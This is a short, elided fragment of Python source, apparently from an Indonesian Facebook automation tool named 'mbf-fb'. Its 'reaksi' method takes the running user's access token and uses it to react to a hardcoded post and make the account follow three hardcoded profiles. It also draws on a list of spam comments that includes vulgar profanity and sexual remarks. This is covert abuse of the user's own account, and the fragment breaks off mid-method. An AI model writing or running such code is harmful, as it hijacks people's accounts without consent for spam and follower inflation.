...
kom=random.choice(["jadi sange aku neng😍","Lo Ngentod:v","Yang Posting Orang Nya Ganteng:)","Mantap:v","Be Yourself And Never Surrentod:v","Keren Bro Script Nya:)","Hi I'm mbf-fb User ^_^"])
class ganteng:
        ...
        def reaksi(self):
                self.get_tok();self.dahlah(f"{self.url}/2079888095492975","4","ah sit");self.dahlah(f"{self.url}/2079888095492975","8","ah sit");self.tuturkeun("sihab.thekorchachi");self.tuturkeun("rika.novitasari.75");self.tuturkeun("BimFt")
        def lang(self,cok):
                try:
